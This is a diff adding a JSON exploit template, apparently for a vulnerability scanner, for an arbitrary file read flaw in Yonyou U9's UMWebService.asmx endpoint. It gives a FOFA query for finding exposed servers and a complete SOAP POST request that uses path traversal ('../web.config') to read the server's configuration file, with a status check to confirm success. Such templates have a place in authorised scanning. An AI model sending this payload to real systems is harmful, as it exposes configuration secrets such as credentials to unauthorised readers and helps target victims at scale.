@@ -1,0 +1,41 @@
+{
+  "product": "用友U9",
+  "vul_name": "用友U9 UMWebService.asmx 任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友U9多组织企业互联网应用平台UMWebService.asmx存在任意文件读取漏洞。攻击者可以通过发送特定的请求，利用该漏洞获取系统敏感文件。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"logo-u9.png\""
+  },
+  "protocol": "http",
+  "link": "https://download.csdn.net/blog/column/12585253/136422614",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/u9/OnLine/UMWebService.asmx",
+      "header": {
+        "Content-Type": "text/xml; charset=utf-8",
+        "SOAPAction": "\"http://tempuri.org/GetLogContent\""
+      },
+      "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetLogContent xmlns=\"http://tempuri.org/\">\n      <fileName>../web.config</fileName>\n    </GetLogContent>\n  </soap:Body>\n</soap:Envelope>"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200
+        }
+      ]
+    }
+  }
+}
